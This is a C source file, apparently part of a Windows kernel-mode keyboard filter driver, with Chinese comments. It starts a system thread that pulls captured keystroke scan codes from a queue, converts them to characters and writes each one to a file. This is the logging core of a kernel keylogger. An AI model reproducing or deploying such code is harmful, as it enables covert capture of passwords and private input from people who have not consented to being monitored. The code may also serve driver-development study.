#include "common.h"
#include "KWrite.h"
#include "ScanCode.h"
extern long g_PendingWrite ;
NTSTATUS InitWriteFileThread(PDRIVER_OBJECT pDriverObject)
//初始化文件写入线程时，需要关闭线程的handle，并获得线程的Object值，
//供关闭线程时等待
{
	HANDLE hThread;
	NTSTATUS Status ;
	PDEVICE_EXTIONSION pDeviceKeyboardDeviceExtension = 
		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
	Status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, WriteFileThread, (PVOID)pDeviceKeyboardDeviceExtension);
	if (!NT_SUCCESS(Status))
	{//BUG:如果线程创建失败，设备不会被关闭
		;
	}
	else
	{
		ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pDeviceKeyboardDeviceExtension->pThreadObj, NULL);
	}
	ZwClose(hThread);
	return Status;
}
VOID WriteFileThread(PVOID Context)
{
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)Context;
	PKEY_DATA pkData;
	char keys[3] = {0};
	PLIST_ENTRY pListEntry;
	while (true)
	{
		KeWaitForSingleObject(&pKeyboardDeviceExtension->sem, Executive, KernelMode, false, NULL);
		if (pKeyboardDeviceExtension->bThreadTerminate == true)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
		
		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->MessageList, &pKeyboardDeviceExtension->kLock);
		pkData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
		//ConvertScanCodeToKeyCode将按键放入keys[0],后两个存储特殊按键
		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, pkData, keys);
		if(keys[0] != 0)
		{
			if (pKeyboardDeviceExtension->hFile != NULL)
			{
				IO_STATUS_BLOCK ioStatus;
				ZwWriteFile(pKeyboardDeviceExtension->hFile, NULL, NULL, NULL ,&ioStatus, keys, strlen(keys), 0, NULL);
			}
		}
		ExFreePool(pkData);
	}
	return ;
}